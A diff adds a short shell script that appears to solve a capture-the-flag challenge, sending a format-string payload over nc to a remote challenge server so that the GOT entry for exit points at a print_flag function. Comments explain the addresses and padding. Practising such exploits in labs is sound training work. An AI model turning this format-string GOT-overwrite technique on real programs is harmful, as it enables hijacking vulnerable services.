@@ -1,0 +1,14 @@
+#!/bin/sh
+
+# <exit@plt>: jmp *0x804a028
+
+# 0x080485cb <print_flag>:
+
+# We only want to write the last 2 bytes because the 2 first are common.
+
+# We pass the addresses were we want to write on the stack (so we write 8bytes
+# on the stack):
+# 0x85 - 8 = 125//first padding
+# 0xcb - 0x85 = 70//second padding
+
+python2 -c 'print "\x28\xa0\x04\x08\x29\xa0\x04\x08%.125x%5$hhn%.70x%4$hhn"' | nc lse.epita.fr 52129
